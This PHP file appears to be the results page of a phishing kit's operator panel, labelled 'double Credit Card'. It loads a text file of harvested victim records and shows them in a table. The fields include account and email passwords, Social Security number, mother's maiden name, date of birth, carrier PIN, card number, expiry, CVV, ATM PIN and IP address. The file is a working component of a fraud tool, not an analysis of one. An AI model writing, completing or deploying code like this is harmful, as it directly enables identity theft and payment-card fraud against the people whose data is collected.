<?php 


require("requires/headers.php");
// Info => Social Security Number / Mother Median name / Date of Birth / phone number / carrier pin
// credt => Credit Card / Expire Date / cvv / ATM
?>
      
        <div class="page-header">
          <div class="container-fluid">
            <ul class="breadcrumb">
            <li class="breadcrumb-item"><a href="home">Home</a></li>
            <li class="breadcrumb-item active">double Credit</li>
          </ul>
          </div>
        </div>
        
        
        <section class="no-padding-top">
          <div class="container-fluid">
            <div class="row">
              
              <div class="col-sm-12">
                <div class="block margin-bottom-sm">
                  <div class="title"><strong>double Credit Card</strong></div>
                  <div class="table-responsive"> 
                    <table class="table table-striped">
                      <thead>
                        <tr>
                          <th scope="col">User</th>
                          <th scope="col">Password</th>
                          <th scope="col">Email</th>
                          <th scope="col">Password</th>
                          <th scope="col">Social/security</th>
                          <th scope="col">MMN</th>
                          <th scope="col">DOB</th>
                          <th scope="col">Phone/Number</th>
                          <th scope="col">car/PIN</th>
                          <th scope="col">CreditCard</th>
                          <th scope="col">exp/Date</th>
                          <th scope="col">CVV</th>
                          <th scope="col">ATM/PIN</th>
                          <th scope="col">IP</th>
                          <th scope="col">Result/Date</th>

                        </tr>
                      </thead>
                      <tbody style="color:white">
                        <?php if (empty(file_get_contents("result/doubleCredit.txt"))) {?>
                          <tr style="color:white !important">          
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                            <td scope="row">Null</td>
                          </tr>
                        <?php }else{
                          include 'result/doubleCredit.txt';
                         } ?>                        
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
              
            </div>
          </div>  
        </section>
<?php
require("requires/footer.php");
 ?>